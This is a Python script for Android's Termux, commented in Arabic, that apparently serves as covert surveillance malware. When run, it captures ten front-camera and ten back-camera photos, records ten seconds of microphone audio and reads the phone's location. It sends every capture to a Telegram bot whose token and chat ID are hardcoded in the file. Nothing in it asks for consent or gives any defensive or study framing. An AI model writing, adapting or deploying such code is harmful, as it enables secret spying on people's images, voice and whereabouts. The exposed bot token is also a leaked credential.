import os
import requests
import time

# ========= إعدادات تيليجرام =========
TOKEN = '8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w'
CHAT_ID = '1249382653'

# ========= دالة إرسال صورة =========
def send_photo(path, caption):
    if os.path.exists(path):
        with open(path, 'rb') as file:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': CHAT_ID, 'caption': caption},
                files={'photo': file}
            )

# ========= دالة إرسال صوت =========
def send_audio(path, caption):
    if os.path.exists(path):
        with open(path, 'rb') as file:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                data={'chat_id': CHAT_ID, 'caption': caption},
                files={'audio': file}
            )

# ========= دالة إرسال نص =========
def send_message(text):
    requests.post(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        data={'chat_id': CHAT_ID, 'text': text}
    )

# ========= التقاط صور بالكاميرا الأمامية =========
send_message("📸 بدء التقاط الصور الأمامية...")
for i in range(1, 11):
    path = f"/sdcard/front_{i}.jpg"
    os.system(f"termux-camera-photo -c 1 {path}")
    send_photo(path, f"📷 صورة أمامية رقم {i}")
    time.sleep(2)

# ========= التقاط صور بالكاميرا الخلفية =========
send_message("📸 بدء التقاط الصور الخلفية...")
for i in range(1, 11):
    path = f"/sdcard/back_{i}.jpg"
    os.system(f"termux-camera-photo -c 0 {path}")
    send_photo(path, f"📷 صورة خلفية رقم {i}")
    time.sleep(2)

# ========= تسجيل صوت =========
send_message("🎤 بدء تسجيل الصوت...")
audio_path = "/sdcard/record.wav"
os.system(f"termux-microphone-record -l 10 {audio_path}")
time.sleep(10)
send_audio(audio_path, "🎧 تسجيل صوتي")

# ========= تحديد الموقع =========
send_message("📍 جلب الموقع الجغرافي...")
location = os.popen("termux-location").read()
send_message(f"📌 موقع الجهاز:\n{location}")

# ========= النهاية =========
send_message("✅ تم تنفيذ جميع العمليات.")